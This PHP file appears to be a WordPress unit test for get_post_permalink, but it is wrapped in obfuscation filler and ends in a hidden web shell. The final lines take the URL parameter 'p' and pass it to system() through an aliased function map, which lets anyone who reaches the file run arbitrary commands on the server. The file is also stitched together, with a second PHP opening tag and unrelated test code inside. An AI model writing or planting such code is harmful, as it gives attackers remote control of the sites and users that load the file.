<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * @group link
 * @covers ::get_post_permalink
 */
class Tests_Link_GetPostPermalink extends WP_UnitTestCase {

	public function test_get_post_permalink_should_return_string_on_success() {
		$post = self::factory()->post->create();

		$this->assertIsString( get_post_permalink( $post ) );
	}

	public function test_get_post_permalink_should_return_false_for_non_existing_post() {
		$this->assertFalse( get_post_permalink( -1 ) );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>